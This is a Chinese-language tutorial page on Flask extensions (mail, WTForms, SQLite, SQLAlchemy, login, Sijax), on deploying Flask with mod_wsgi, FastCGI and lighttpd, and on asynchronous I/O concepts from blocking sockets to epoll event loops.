向邮件添加另一个收件人

</pre>Google gmail服务的SMTP服务器用作Flask-Mail配置的MAIL_SERVER,Gmail服务中的内置不安全功能可能会阻止此次登录尝试。您可能必须降低安全级别。请登录您的Gmail帐户并访问此链接以降低安全性<textarea>
from flask import Flask
from flask_mail import Mail, Message  # 从flask-mail模块导入Mail和Message类

app =Flask(__name__)
mail=Mail(app)

# 配置Flask-Mail
app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'yourId@gmail.com'
app.config['MAIL_PASSWORD'] = '*****'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True

# 创建Mail类的实例
mail = Mail(app)

# 在由URL规则('/')映射的Python函数中设置Message对象
@app.route("/")
def index():
   msg = Message('Hello', sender = 'yourId@gmail.com', recipients = ['id1@gmail.com'])
   msg.body = "Hello Flask message sent from Flask-Mail"
   mail.send(msg)
   return "Sent"

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
【 Flask WTF 】
Web应用程序的一个重要方面是为用户提供用户界面。HTML提供了一个form标签,用于设计界面。可以适当地使用Form(表单)元素,例如文本输入,单选按钮,选择等。

用户输入的数据以Http请求消息的形式通过GET或POST方法提交给服务器端脚本。
服务器端脚本必须从http请求数据重新创建表单元素。因此实际上表单元素必须定义两次,一次在HTML中,另一次在服务器端脚本中。
使用HTML表单的另一个缺点是很难(如果不是不可能的话)动态呈现表单元素。HTML本身无法验证用户的输入。

这就是WTForms的作用,一个灵活的表单,渲染和验证库,能够方便使用。Flask-WTF扩展为这个WTForms库提供了一个简单的接口。
使用Flask-WTF,可以在Python脚本中定义表单字段,并使用HTML模板进行渲染。还可以将验证应用于WTF字段。

pip install flask-WTF

已安装的软件包包含一个Form类,该类必须用作用户定义表单的父级。
WTforms包中包含各种表单字段的定义。下面列出了一些标准表单字段
TextField: 表示< input type ='text'> HTML表单元素
BooleanField: 表示< input type ='checkbox'> HTML表单元素
DecimalField: 用于显示带小数的数字的文本字段
IntegerField: 用于显示整数的文本字段
RadioField: 表示< input type = 'radio'> HTML表单元素
SelectField: 表示选择表单元素
TextAreaField: 表示< testarea> HTML表单元素
PasswordField: 表示< input type = 'password'> HTML表单元素
SubmitField: 表示< input type = 'submit'>表单元素

</pre><textarea>
# 包含文本字段的表单可以设计如下：
from flask_wtf import Form
from wtforms import TextField

class ContactForm(Form):
   name = TextField("Name Of Student")

# 除了'name'字段,还会自动创建CSRF令牌的隐藏字段。这是为了防止Cross Site Request Forgery(跨站请求伪造)攻击。渲染时,这将导致等效的HTML脚本,如下所示：
< input id = "csrf_token" name = "csrf_token" type = "hidden" />
< label for = "name">Name Of Student< /label>< br>
< input id = "name" name = "name" type = "text" value = "" />

# 在Flask应用程序中使用用户定义的表单类,并使用模板呈现表单。
from flask import Flask, render_template
from forms import ContactForm
app = Flask(__name__)
app.secret_key = 'development key'

@app.route('/contact')
def contact():
   form = ContactForm()
   return render_template('contact.html', form = form)

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
WTForms包也包含验证器类,它对表单字段应用验证很有用。以下列表显示了常用的验证器。
DataRequired: 检查输入字段是否为空
Email: 检查字段中的文本是否遵循电子邮件ID约定
IPAddress: 在输入字段中验证IP地址
Length: 验证输入字段中的字符串的长度是否在给定范围内
NumberRange: 验证给定范围内输入字段中的数字
URL: 验证在输入字段中输入的URL

对联系表单中的name字段应用'DataRequired'验证规则
name = TextField("Name Of Student",[validators.Required("Please enter your name.")])
如果验证失败,表单对象的validate()函数将验证表单数据并抛出验证错误。Error消息将发送到模板。在HTML模板中,动态呈现error消息。
{% for message in form.name.errors %} {{ message }} {% endfor %}

</pre><textarea>
### Contact表单的设计如下(forms.py)
from flask_wtf import Form
from wtforms import TextField, IntegerField, TextAreaField, SubmitField, RadioField, SelectField
from wtforms import validators, ValidationError

class ContactForm(Form):
    name = TextField("Name Of Student",[validators.Required("Please enter your name.")])
    Gender = RadioField('Gender', choices = [('M','Male'),('F','Female')])
    Address = TextAreaField("Address")
    email = TextField("Email",[
        validators.Required("Please enter your email address."),
        validators.Email("Please enter your email address.")
    ])
    Age = IntegerField("age")
    language = SelectField('Languages', choices = [('cpp', 'C++'),  ('py', 'Python')])
    submit = SubmitField("Send")

### Flask应用程序脚本(formexample.py)
from flask import Flask, render_template, request, flash
from forms import ContactForm
app = Flask(__name__)
app.secret_key = 'development key'

@app.route('/contact', methods = ['GET', 'POST'])
def contact():
    form = ContactForm()

    if request.method == 'POST':
        if form.validate() == False:
            flash('All fields are required.')
            return render_template('contact.html', form = form)
        else:
            return render_template('success.html')
    elif request.method == 'GET':
        return render_template('contact.html', form = form)

if __name__ == '__main__':
    app.run(debug = True)

### 模板(contact.html)的脚本
{% for message in form.name.errors %}{{ message }}{% endfor %}
{% for message in form.email.errors %}{{ message }}{% endfor %}

< form action = "http://localhost:5000/contact" method = post>
    {{ form.hidden_tag() }}
    {{ form.name.label }}< br>{{ form.name }}< br>
    {{ form.Gender.label }} {{ form.Gender }}
    {{ form.Address.label }}< br>{{ form.Address }}< br>
    {{ form.email.label }}< br>{{ form.email }}< br>
    {{ form.Age.label }}< br>{{ form.Age }} < br>
    {{ form.language.label }}< br>{{ form.language }}< br>
    {{ form.submit }}
< /form>

</textarea><pre>
【 Flask应用程序与SQLite交互 】
创建一个SQLite数据库'database.db'并在其中创建学生表。
import sqlite3
conn = sqlite3.connect('database.db')
print("Opened database successfully")
conn.execute('CREATE TABLE students (name TEXT, addr TEXT, city TEXT, pin TEXT)')
print("Table created successfully")
conn.close()

</pre><textarea>
from flask import Flask, render_template, request
import sqlite3 as sql
app = Flask(__name__)

@app.route('/')
def home():
   return render_template('home.html')

@app.route('/enternew')
def new_student():
   return render_template('student.html')

@app.route('/addrec',methods = ['POST', 'GET'])
def addrec():
   if request.method == 'POST':
      try:
         nm = request.form['nm']
         addr = request.form['add']
         city = request.form['city']
         pin = request.form['pin']
         with sql.connect("database.db") as con:
            cur = con.cursor()
            cur.execute("INSERT INTO students (name,addr,city,pin) VALUES (?,?,?,?)",(nm,addr,city,pin) )
            con.commit()
            msg = "Record successfully added"
      except:
         con.rollback()
         msg = "error in insert operation"
      finally:
         return render_template("result.html",msg = msg)
         con.close()

@app.route('/list')
def list():
   con = sql.connect("database.db")
   con.row_factory = sql.Row
   cur = con.cursor()
   cur.execute("select * from students")
   rows = cur.fetchall();
   return render_template("list.html",rows = rows)

if __name__ == '__main__':
   app.run(debug = True)

</textarea><pre>
【 Flask SQLAlchemy 】
在Flask Web应用程序中使用原始SQL对数据库执行CRUD操作可能很繁琐。相反SQLAlchemy工具包是一个强大的OR Mapper,它为应用程序开发人员提供了SQL的全部功能和灵活性。Flask-SQLAlchemy是Flask扩展,它将对SQLAlchemy的支持添加到Flask应用程序中。

什么是ORM(Object Relation Mapping,对象关系映射)？
大多数编程语言平台是面向对象的。另一方面,RDBMS服务器中的数据存储为表。对象关系映射是将对象参数映射到底层RDBMS表结构的技术。ORM API提供了执行CRUD操作的方法,而不必编写原始SQL语句

pip install flask-sqlalchemy

FlaskSQLAlchemy是flask和SQLALchemy的管理者,其本质是在flask项目中 通过对文件管理、导入,把Flask和QLAlchemy两个组件无缝连接在一起,还可以帮助实现自动开启、关闭连接、配置提升开发效率

常见情况下对于只有一个Flask应用,所有需要做的事情就是创建Flask应用,选择加载配置接着创建SQLAlchemy对象时候把Flask应用传递给它作为参数。
一旦创建,这个对象就包含sqlalchemy和sqlalchemy.orm中的所有函数和助手。此外它还提供一个名为Model的类,用于作为声明模型时的delarative基类:

</pre><textarea>
from flask import Flask
from flask.ext.sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True)
    email = db.Column(db.String(120), unique=True)

    def __init__(self, username, email):
        self.username = username
        self.email = email

    def __repr__(self):
        return '<User %r>' % self.username

</textarea><pre>
为了创建初始数据库,只需要从交互式Python shell中导入db对象并且调用SQLAlchemy.create_all()方法来创建表和数据库:
>>> from yourapplication import db
>>> db.create_all()

创建用户
>>> from yourapplication import User
>>> admin = User('admin', 'admin@example.com')
>>> guest = User('guest', 'guest@example.com')
>>> db.session.add(admin)
>>> db.session.add(guest)
>>> db.session.commit()

访问数据库中的数据
>>> users = User.query.all()
[< User u'admin'>, < User u'guest'>]
>>> admin = User.query.filter_by(username='admin').first()
< User u'admin'>

简单的关系
SQLAlchemy连接到关系型数据库,关系型数据最擅长的东西就是关系,创建一个使用两张相互关联的表的应用

</pre><textarea>
from datetime import datetime

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(80))
    body = db.Column(db.Text)
    pub_date = db.Column(db.DateTime)

    category_id = db.Column(db.Integer, db.ForeignKey('category.id'))
    category = db.relationship('Category', backref=db.backref('posts', lazy='dynamic'))

    def __init__(self, title, body, category, pub_date=None):
        self.title = title
        self.body = body
        if pub_date is None: pub_date = datetime.utcnow()
        self.pub_date = pub_date
        self.category = category

    def __repr__(self):
        return '< Post %r>' % self.title

class Category(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50))

    def __init__(self, name):
        self.name = name

    def __repr__(self):
        return '< Category %r>' % self.name

</textarea><pre>
创建一些对象:
>>> py = Category('Python')
>>> p = Post('Hello Python!', 'Python is pretty cool', py)
>>> db.session.add(py)
>>> db.session.add(p)

现在因为在backref中声明了posts作为动态关系,查询显示为:
>>> py.posts
< sqlalchemy.orm.dynamic.AppenderBaseQuery object at 0x1027d37d0>

它的行为像一个普通的查询对象,因此可以查询与测试的"Python"分类相关的所有文章(posts):
>>> py.posts.all()
[< Post 'Hello Python!'>]

与普通的SQLAlchemy不同之处:
SQLAlchemy允许访问下面的东西:
sqlalchemy和sqlalchemy.orm下所有的函数和类
一个叫做session的预配置范围的会话(session)
metadata属性
engine属性
SQLAlchemy.create_all()和SQLAlchemy.drop_all(),根据模型用来创建以及删除表格的方法
一个Model基类,即是一个已配置的声明(declarative)的基础(base)
Model声明基类行为类似一个常规的Python类,不过有个query属性,可以用来查询模型(Model和BaseQuery)
必须提交会话,但是没有必要在每个请求后删除它(session),Flask-SQLAlchemy会帮助完成删除操作。

SQLAlchemy的Session对象管理ORM对象的所有持久性操作。
以下session方法执行CRUD操作：
db.session.add(模型对象) - 将记录插入到映射表中
db.session.delete(模型对象) - 从表中删除记录
model.query.all() - 从表中检索所有记录(对应于SELECT查询)
Students.query.filter_by(city = 'Hyderabad').all()

</pre><textarea>
from flask import Flask, request, flash, url_for, redirect, render_template
from flask_sqlalchemy import SQLAlchemy # 从此模块导入SQLAlchemy类

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///students.sqlite3'
app.config['SECRET_KEY'] = "random string"

db = SQLAlchemy(app) #对象包含用于ORM操作的辅助函数

class students(db.Model):
    id = db.Column('student_id', db.Integer, primary_key = True)
    name = db.Column(db.String(100))
    city = db.Column(db.String(50))
    addr = db.Column(db.String(200))
    pin = db.Column(db.String(10))

    def __init__(self, name, city, addr,pin):
        self.name = name
        self.city = city
        self.addr = addr
        self.pin = pin

@app.route('/')
def show_all():
   return render_template('show_all.html', students = students.query.all() )

@app.route('/new', methods = ['GET', 'POST'])
def new():
   if request.method == 'POST':
      if not request.form['name'] or not request.form['city'] or not request.form['addr']:
         flash('Please enter all the fields', 'error')
      else:
         student = students(request.form['name'], request.form['city'], request.form['addr'], request.form['pin'])
         db.session.add(student)
         db.session.commit()
         flash('Record was successfully added')
         return redirect(url_for('show_all'))
   return render_template('new.html')

if __name__ == '__main__':
   db.create_all()  # 要创建/使用URI中提及的数据库,请运行create_all()方法
   app.run(debug = True)

</textarea><pre>
【 flask-migrate 】
pip install flask-migrate

安装了flask-sqlalchemy就可以对数据库进行操作了,实际项目中会经常对数据库进行修改,但一般不会手动的去数据库里进行改动,通常的做法是修改ORM对应的模型,然后再把模型映射到数据库中。在flask里有一个集成的工具flask-migrate是专门做这个事情的

【 flask-login 】
pip install flask-login

它会:
在会话中存储当前活跃的用户ID,让你能够自由地登入和登出。
让你限制登入(或者登出)用户可以访问的视图。
处理让人棘手的 "记住我" 功能。
帮助保护用户会话免遭cookie被盗的牵连。
可以与以后可能使用的Flask-Principal或其它认证扩展集成。

但是它不会:
限制使用特定的数据库或其它存储方法。如何加载用户完全由你决定。
限制使用用户名和密码,OpenIDs,或者其它的认证方法。
处理超越 "登入或者登出" 之外的权限。
处理用户注册或者账号恢复。

【 Flask Sijax 】
Sijax代表'Simple Ajax',它是一个Python/jQuery库,旨在帮助您轻松地将Ajax引入到您的应用程序。它使用jQuery.ajax来发出AJAX请求。

pip install flask-sijax

组态
SIJAX_STATIC_PATH - 要被镜像的Sijax javascript文件的静态路径。默认位置是static/js/sijax。在此文件夹中保留sijax.js和json2.js文件。
SIJAX_JSON_URI - 从中加载json2.js静态文件的URI

Sijax使用JSON在浏览器和服务器之间传递数据,这意味着浏览器需要本机支持JSON或从json2.js文件支持JSON支持。
以这种方式注册的函数不能提供Sijax功能,因为默认情况下无法使用POST方法访问它们(并且Sijax使用POST请求)。

要使View函数能够处理Sijax请求,请使用@app.route('/url',methods = [\'GET\' ,\'POST\'])或使用@flask_sijax.route辅助装饰器
@flask_sijax.route(app, '/hello')

每个Sijax处理函数(像这样)都会自动接收至少一个参数,就像Python将'self'传递给对象方法一样。'obj_response'参数是函数回复浏览器的方式。
def say_hi(obj_response):
   obj_response.alert('Hi there!')

当检测到Ajax请求时,Sijax会像这样处理它：
g.sijax.register_callback('say_hi', say_hi)
   return g.sijax.process_request()

当Sijax向服务器请求(特殊的jQuery.ajax()请求)时,g.sijax.is_sijax_request()会在服务器上检测到此请求,在这种情况下让Sijax处理请求。
使用g.sijax.register_callback()注册的所有函数都会公开,以便从浏览器进行调用。
调用g.sijax.process_request()会告诉Sijax执行适当的(先前注册的)函数并将响应返回给浏览器。

</pre><textarea>
import os
from flask import Flask, g
from flask_sijax import sijax

app = Flask(__name__)

app.config['SIJAX_STATIC_PATH'] = os.path.join('.', os.path.dirname(__file__), 'static/js/sijax/')
app.config['SIJAX_JSON_URI'] = '/static/js/sijax/json2.js'
flask_sijax.Sijax(app)

@app.route('/')
def index():
   return 'Index'

@flask_sijax.route(app, '/hello')
def hello():
   def say_hi(obj_response):
      obj_response.alert('Hi there!')
   if g.sijax.is_sijax_request:
      # Sijax request detected - let Sijax handle it
      g.sijax.register_callback('say_hi', say_hi)
      return g.sijax.process_request()
      return _render_template('sijaxexample.html')

if __name__ == '__main__':
   app.run(debug = True)

</textarea>
</div>

<div id="flask_production">
<h4>部署到网络服务器</h4><pre>
【 外部可见服务器 】
开发服务器上的Flask应用程序只能在设置了开发环境的计算机上访问。这是一种默认行为,因为在调试模式下,用户可以在计算机上执行任意代码。
如果禁用了debug,则可以通过将主机名设置为'0.0.0.0',使本地计算机上的开发服务器可供网络上的用户使用,因此您的操作系统将侦听所有公共IP
app.run(host = '0.0.0.0')

【 部署 】
要从开发环境切换到成熟的生产环境需要在真实的Web服务器上部署应用程序,根据具体情况可以使用不同的选项来部署Flask Web应用程序。

对于小型应用程序,可以考虑在以下任何托管平台上部署它,所有这些平台都为小型应用程序提供免费计划。
Flask应用程序可以部署在Heroku、dotcloud、webfaction这些云平台上。此外可以在Google云平台上部署Flask应用程序。Localtunnel服务允许在localhost上共享应用程序,而不会破坏DNS和防火墙设置。

如果倾向于使用专用Web服务器代替上述共享平台,则可以使用以下选项进行探索

mod_wsgi是一个Apache模块,它提供了一个WSGI兼容接口,用于在Apache服务器上托管基于Python的Web应用程序。
pip install mod_wsgi
要验证安装是否成功,请使用start-server命令运行mod_wsgi-express脚本：
mod_wsgi-express start-server
这将在端口8000上启动Apache/mod_wsgi,然后可以通过将浏览器指向以下内容来验证安装是否有效：
http://localhost:8000/

创建.wsgi文件
应该有一个yourapplication.wsgi文件。此文件包含代码mod_wsgi,该代码在启动时执行以获取应用程序对象。对大多数应用程序以下文件应该足够了：
from yourapplication import app as application
确保yourapplication和所有正在使用的库都在python加载路径上。

配置Apache
需要告诉mod_wsgi应用程序的位置：

</pre><textarea>
< VirtualHost *>
   ServerName example.com
   WSGIScriptAlias / C:\yourdir\yourapp.wsgi

   < Directory C:\yourdir>
      Order deny,allow
      Allow from all
   < /Directory>

< /VirtualHost>

</textarea><pre>
独立的WSGI容器
有很多流行的服务器用Python编写,它们包含WSGI应用程序并提供HTTP服务。
Gunicorn
Tornado
Gevent
Twisted Web

【 Flask FastCGI 】
FastCGI是在nginx、lighttpd和Cherokee等web服务器上的Flask应用程序的另一个部署选项。

配置FastCGI
首先需要创建FastCGI服务器文件,让我们称之为yourapplication.fcgiC。

</pre><textarea>
from flup.server.fcgi import WSGIServer
from yourapplication import app

if __name__ == '__main__':
   WSGIServer(app).run()

</textarea><pre>
nginx和旧版本的lighttpd需要显式传递套接字以与FastCGI服务器通信,为此需要将套接字的路径传递到WSGIServer。
WSGIServer(application, bindAddress = '/path/to/fcgi.sock').run()

配置Apache
对于基本的Apache部署,.fcgi文件将出现在应用程序URL中。例如：example.com/yourapplication.fcgi/hello/。有几种方法可以配置应用程序,以使yourapplication.fcgi不会出现在URL中。

</pre><textarea>
< VirtualHost *>
   ServerName example.com
   ScriptAlias / /path/to/yourapplication.fcgi/
< /VirtualHost>

</textarea><pre>
配置lighttpd
lighttpd的基本配置如下所示：

</pre><textarea>
fastcgi.server = ("/yourapplication.fcgi" => ((
   "socket" => "/tmp/yourapplication-fcgi.sock",
   "bin-path" => "/var/www/yourapplication/yourapplication.fcgi",
   "check-local" => "disable",
   "max-procs" => 1
)))

alias.url = (
   "/static/" => "/path/to/your/static"
)

url.rewrite-once = (
   "^(/static($|/.*))$" => "$1",
   "^(/.*)$" => "/yourapplication.fcgi$1"
)

</textarea><pre>
请记住启用FastCGI,alias和rewrite模块,此配置将应用程序绑定到/yourapplication

</pre>
</div>

<div id="asyncio">
<h3>异步IO</h3><pre>
阻塞
程序未得到所需计算资源时被挂起的状态。
程序在等待某个操作完成期间,自身无法继续干别的事情,则称该程序在该操作上是阻塞的。
常见的阻塞形式有:网络I/O阻塞、磁盘I/O阻塞、用户输入阻塞等。
阻塞是无处不在的,包括CPU切换上下文时所有进程都无法真正干事情,它们也会被阻塞。如果是多核CPU则正在执行上下文切换操作的核不可被利用

非阻塞
程序在等待某操作过程中,自身不被阻塞,可以继续运行干别的事情,则称该程序在该操作上是非阻塞的。
非阻塞并不是在任何程序级别、任何情况下都可以存在的,仅当程序封装的级别可以囊括独立的子程序单元时它才可能存在非阻塞状态。
非阻塞的存在是因为阻塞存在,正因为某个操作阻塞导致的耗时与效率低下才要把它变成非阻塞的。

同步
不同程序单元为了完成某个任务,在执行过程中需靠某种通信方式以协调一致,称这些程序单元是同步执行的。
例如购物系统中更新商品库存,需要用"行锁"作为通信信号,让不同的更新请求强制排队顺序执行,那更新库存的操作是同步的。
简言之,同步意味着有序。

异步
为完成某个任务,不同程序单元之间过程中无需通信协调,也能完成任务的方式,不相关的程序单元之间可以是异步的,例如爬虫下载网页。调度程序调用下载程序后即可调度其他任务,而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的,也无需相互通知协调。这些异步操作的完成时刻并不确定。
简言之,异步意味着无序。

上文提到的"通信方式"通常是指异步和并发编程提供的同步原语,如信号量、锁、同步队列等。虽然这些通信方式是为了让多个程序在一定条件下同步执行,但正因为是异步的存在才需要这些通信方式。如果所有程序都是按序执行,其本身就是同步的,又何需这些同步信号呢？

几种风格的异步接口:
回调参数
返回一个占位符 (Future, Promise, Deferred)
传送给一个队列
回调注册表 (POSIX信号)

并发
并发描述的是程序的组织结构,指程序要被设计成多个可独立执行的子任务,以利用有限的计算机资源使多个任务可以被实时或近实时执行为目的。

并行
并行描述的是程序的执行状态,指多个任务同时被执行,以利用富余计算资源(多核CPU)加速完成多个任务为目的。
并发提供了一种程序组织结构方式,让问题的解决方案可以并行执行,但并行执行不是必须的

概念总结
并行是为了利用多核加速多任务完成的进度
并发是为了让独立的子任务都有机会被尽快执行,但不一定能加速整体进度
非阻塞是为了提高程序整体执行效率
异步是高效地组织非阻塞任务的方式
要支持并发必须拆分为多任务,不同任务相对而言才有阻塞/非阻塞、同步/异步,所以并发、异步、非阻塞三个词总是如影随形。

异步编程
以进程、线程、协程、函数/方法作为执行任务程序的基本单位,结合回调、事件循环、信号量等机制,以提高程序整体执行效率和并发能力的编程方式。
如果在某程序的运行时能根据已经执行的指令准确判断它接下来要进行哪个具体操作,那它是同步程序,反之则为异步程序,无序与有序的区别

同步/异步、阻塞/非阻塞并非水火不容,要看讨论的程序所处的封装级别,例如购物程序在处理多个用户的浏览请求可以是异步的,而更新库存时必须是同步的

异步之难
控制不住的程序,因为其执行顺序不可预料,当下正要发生什么事件不可预料。在并行情况下更为复杂和艰难。
所以几乎所有的异步框架都将异步编程模型简化:一次只允许处理一个事件。故而有关异步的讨论几乎都集中在了单线程内。
如果某事件处理程序需要长时间执行,所有其他部分都会被阻塞。
所以一旦采取异步编程,每个异步调用必须"足够小",不能耗时太久。如何拆分异步任务成了难题。
程序下一步行为往往依赖上一步执行结果,如何知晓上次异步调用已完成并获取结果？
回调(Callback)成了必然选择。那又需要面临"回调地狱"的折磨。
同步代码改为异步代码,必然破坏代码结构,解决问题的逻辑也要转变,不再是一条路走到黑,需要精心安排异步任务

CPU是计算机的处理核心,也是最宝贵的资源,如果有浪费CPU的运行时间,导致其利用率不足,那程序效率必然低下
如果一个程序不能有效利用一台计算机资源,那必然需要更多的计算机通过运行更多的程序实例来弥补需求缺口,使用Python异步编程后可减少计算机的数量来降低成本、提高效率

C10k(concurrently handling 10k connections)是一个在1999年被提出来的技术挑战,如何在一颗1GHz CPU,2G内存,1gbps网络环境下,让单台服务器同时为1万个客户端提供FTP服务。而到了2010年后,随着硬件技术的发展,这个问题被延伸为C10M,即如何利用8核心CPU,64G内存,在10gbps的网络上保持1000万并发连接,或是每秒钟处理100万的连接。(两种类型的计算机资源在各自的时代都约为1200美元)
成本和效率问题是从企业经营角度讲,C10k/C10M问题则是从技术角度出发挑战软硬件极限。C10k/C10M 问题得解,成本问题和效率问题迎刃而解。

CPU很快,而上下文切换慢、内存读数据慢、磁盘寻址与取数据慢、网络传输慢……总之离开CPU后的一切,除了一级高速缓存,都很慢。
计算机的组成主要由运算器、控制器、存储器、输入设备、输出设备五部分组成。运算器和控制器主要集成在CPU中,除此之外全是I/O,包括读写内存、读写磁盘、读写网卡全都是I/O,I/O成了最大的瓶颈。
异步程序可以提高效率,而最大的瓶颈在I/O,业界诞生的解决方案是异步I/O

如今地球上最发达、规模最庞大的计算机程序莫过于因特网。而从CPU的时间观中可知,网络I/O是最大的I/O瓶颈,除了宕机没有比它更慢的,所以诸多异步框架都对准的是网络I/O

从一个爬虫例子说起,从因特网上下载10篇网页

1、同步阻塞方式
最容易想到的解决方案就是依次下载,从建立socket连接到发送网络请求再到读取响应数据顺序进行
创建网络连接多久能创建完成不是客户端决定的,而是由网络状况和服务端处理能力共同决定,服务端什么时候返回了响应数据并被客户端接收到可供程序读取也是不可预测的,所以sock.connect()和sock.recv()这两个调用在默认情况下是阻塞的。
sock.send()函数并不会阻塞太久,它只负责将请求数据拷贝到TCP/IP协议栈的系统缓冲区中就返回,并不等待服务端返回的应答确认

假设网络环境很差,创建网络连接需要1秒钟,那么sock.connect()就得阻塞1秒钟等待网络连接成功。这1秒钟对一颗2.6GHz的CPU来讲,仿佛过去了83年,然而它不能干任何事情。sock.recv()也是一样的必须得等到服务端的响应数据已经被客户端接收。下载10篇网页,这个阻塞过程就得重复10次。如果一个爬虫系统每天要下载1000万篇网页呢？

所以同步阻塞的网络交互方式,效率低十分低下,特别是在网络交互频繁的程序中,这种方式根本不可能挑战C10K/C10M

2、多进程
在一个程序内依次执行10次太耗时,那开10个一样的程序同时执行不就行了。于是想到了多进程编程,在更早的操作系统Linux2.4及其以前进程是OS调度任务的实体,是面向进程设计的OS。
改善效果立竿见影,但仍然有问题,总体耗时并没有缩减到原来的十分之一,而是九分之一左右,还有一些时间耗到进程切换开销
进程切换开销不止像"CPU的时间观"所列的"上下文切换"那么低,CPU从一个进程切换到另一个进程,需要把旧进程运行时的寄存器状态、内存状态全部保存好,再将另一个进程之前保存的数据恢复。对CPU来讲,几个小时就干等着。当进程数量大于CPU核心数量时,进程切换是必然需要的。
除了切换开销,多进程还有另外的缺点,一般的服务器在能够稳定运行的前提下,可以同时处理的进程数在数十个到数百个规模。如果进程数量规模更大,系统运行将不稳定,而且可用内存资源往往也会不足。

多进程解决方案在面临每天需要成百上千万次下载任务的爬虫系统,或需要同时搞定数万并发的电商系统来说并不适合。
除了切换开销大以及可支持的任务规模小之外,多进程还有其他缺点如状态共享等问题

3、多线程
由于线程的数据结构比进程更轻量级,同一个进程可以容纳多个线程,从进程到线程的优化由此展开。后来的OS也把调度单位由进程转为线程,进程只作为线程的容器,用于管理进程所需的资源,而且OS级别的线程是可以被分配到不同的CPU核心同时运行的。

结果符合预期,比多进程耗时要少些。从运行时间上看,多线程似乎已经解决了切换开销大的问题,而且可支持的任务数量规模,也变成了数百个到数千个。
但多线程仍有问题,特别是Python里的多线程。首先Python中的多线程因为GIL的存在,它们并不能利用CPU多核优势,一个Python进程中只允许有一个线程处于运行状态。那为什么结果还是如预期,耗时缩减到了十分之一？
因为在做阻塞的系统调用时例如sock.connect(),sock.recv(),当前线程会释放GIL,让别的线程有执行机会,但单个线程内在阻塞调用上还是阻塞的。

Python中time.sleep是阻塞的,都知道使用它要谨慎,但在多线程编程中time.sleep并不会阻塞其他线程。

除了GIL之外,所有的多线程还有通病,它们是被OS调度,调度策略是抢占式的,以保证同等优先级的线程都有均等的执行机会,那带来的问题是:并不知道下一时刻是哪个线程被运行,也不知道它正要执行的代码是什么,所以就可能存在竞态条件。
例如爬虫工作线程从任务队列拿待抓取URL的时候,如果多个爬虫线程同时来取,那这个任务到底该给谁？那就需要用到"锁"或"同步队列"来保证下载任务不会被重复执行。
而且线程支持的多任务规模,在数百到数千的数量规模,在大规模的高频网络交互系统中,仍然有些吃力,当然多线程最主要的问题还是竞态条件。

4、非阻塞方式
一是耗时与同步阻塞相当,二是代码更复杂,要非阻塞何用？
sock.setblocking(False)告诉OS,让socket上阻塞调用都改为非阻塞的方式。非阻塞就是在做一件事的时候,不阻碍调用它的程序做别的事情。上述代码在执行完sock.connect()和sock.recv()后的确不再阻塞,可以继续往下执行请求准备的代码或执行下一次读取。
代码变得更复杂也是上述原因所致。放在try语句内,是因为socket在发送非阻塞连接请求过程中,系统底层也会抛出异常,connect()被调用之后立即可以往下执行代码。
需要while循环不断尝试send(),是因为connect()已经非阻塞,在send()之时并不知道socket的连接是否就绪,只有不断尝试直到成功为止,即发送数据成功了。recv()调用也是同理。
虽然connect()和recv()不再阻塞主程序,空出来的时间段CPU没有空闲着,但并没有利用好这空闲去做其他有意义的事情,而是在循环尝试读写socket,不停判断非阻塞调用的状态是否就绪。还得处理来自底层的可忽略的异常,也不能同时处理多个socket
然后10次下载任务仍然按序进行,所以总体执行时间和同步阻塞相当

5、非阻塞改进
5.1 epoll
判断非阻塞调用是否就绪如果OS能做,是不是应用程序就可以不用自己去等待和判断了,就可以利用这个空闲去做其他事情以提高效率。
所以OS将I/O状态的变化都封装成了事件,如可读事件、可写事件,并且提供了专门的系统模块让应用程序可以接收事件通知,这个模块就是select,让应用程序可以通过select注册文件描述符和回调函数。当文件描述符的状态发生变化时select就调用事先注册的回调函数。
select因其算法效率比较低,后来改进成了poll,再后来又有进一步改进,BSD内核改进成了kqueue模块,而Linux内核改进成了epoll模块。这四个模块的作用都相同,暴露的API也几乎一致,区别在于kqueue和epoll在处理大量文件描述符时效率更高,鉴于Linux服务器的普遍性以及为了追求更高效率,所以常常听闻被探讨的模块都是epoll

5.2 回调(Callback)
把I/O事件的等待和监听任务交给了OS,那OS在知道I/O状态发生改变后,例如socket连接已建立成功可发送数据,它又怎么知道接下来该干嘛呢？只能回调。
需要将发送数据与读取数据封装成独立的函数,让epoll代替应用程序监听socket状态时,得告诉epoll:"如果socket状态变为可以往里写数据即连接建立成功了,请调用HTTP请求发送函数。如果socket变为可以读数据了(客户端已收到响应),请调用响应处理函数。"

于是利用epoll结合回调机制重构爬虫代码
首先不断尝试send()和recv()的两个循环被消灭掉了。
其次导入了selectors模块,并创建了一个DefaultSelector实例,Python标准库提供的selectors模块是对底层select/poll/epoll/kqueue的封装。DefaultSelector类会根据OS环境自动选择最佳的模块,那在Linux2.5.44及更新的版本上都是epoll了。
然后分别注册了socket可写事件(EVENT_WRITE)和可读事件(EVENT_READ)发生后应该采取的回调函数。
虽然代码结构清晰了,阻塞操作也交给OS去等待和通知了,但要抓取10个不同页面就得创建10个Crawler实例,就有20个事件将要发生,那如何从selector里获取当前正发生的事件,并且得到对应的回调函数去执行呢？

5.3 事件循环(Event Loop)
为了解决上述问题,那只得采用老办法,写一个循环去访问selector模块,等待它告诉当前是哪个事件发生了,应该对应哪个回调。这个等待事件通知的循环称之为事件循环。

用stopped全局变量控制事件循环何时停止。当urls_todo消耗完毕后会标记stopped为True。
selector.select()是一个阻塞调用,因为如果事件不发生,那应用程序就没事件可处理,所以就干脆阻塞在这里等待事件发生。那可以推断,如果只下载一篇网页,一定要connect()之后才能send()继而recv(),那它的效率和阻塞的方式是一样的。因为不在connect()/recv()上阻塞,也得在select()上阻塞。
